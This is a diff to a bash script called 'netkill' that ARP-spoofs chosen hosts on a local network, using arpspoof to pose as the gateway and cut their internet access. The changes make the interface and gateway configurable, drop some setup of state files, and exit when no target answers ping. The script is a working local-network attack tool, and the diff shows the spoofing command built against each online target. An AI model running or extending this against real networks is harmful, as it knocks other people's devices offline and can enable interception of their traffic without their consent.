@@ -1,12 +1,12 @@
 #!/bin/bash
-INTERFACE=enp1s0
-GATEWAY="192.168.50.1"
+INTERFACE=${DEFAULT_INTERFACE:-eth0}
+GATEWAY=${DEFAULT_GATEWAY:-'192.168.0.1'}
 PID_FILE="/tmp/netkill_pids"
 TARGETS_FILE="/tmp/netkill_targets"
 LOG_DATE=$(date +"%Y-%m-%d")
 LOG_DIR="/var/log/netkill/$LOG_DATE"
 DAYS_TO_KEEP_LOGS=7
-DRY_RUN=false
+DRY_RUN=${DRY_RUN:-false}
 
 # ─────────────────────────────────────────
 #  Color output
@@ -48,6 +48,7 @@ fi
 
 kill_internet() {
     info "NETKILL starting..."
+    local isSpoofing=0
 
     if [[ -f "$PID_FILE" ]]; then
         warn "There's already another PID file at $PID_FILE"
@@ -65,15 +66,11 @@ kill_internet() {
         exit 1
     fi
 
-    info "Cleaning previous states"
-    if [[ "$DRY_RUN" == false ]]; then
-        touch "$PID_FILE" "$TARGETS_FILE"
-    fi
-
     for target in "$@"; do
         info "Checking if $target is online..."
 
         if ping -c1 -W1 "$target"; then
+            isSpoofing=1
             info "$target is online, ready for spoofing"
             SPOOF_CMD="/bin/arpspoof -i \"$INTERFACE\" -t \"$target\" \"$GATEWAY\" >\"$LOG_DIR/$target\" 2>&1 &"
 
@@ -94,6 +91,11 @@ kill_internet() {
             warn "$target is offline or unreachable. Will not spoof to prevent GARP broadcasts."
         fi
     done
+
+    if [[ "$isSpoofing" == 0 ]]; then
+        info "No targets online"
+        exit 1
+    fi
 
     if [[ "$DRY_RUN" == true ]]; then
         info "Dry run completed. No processes started."
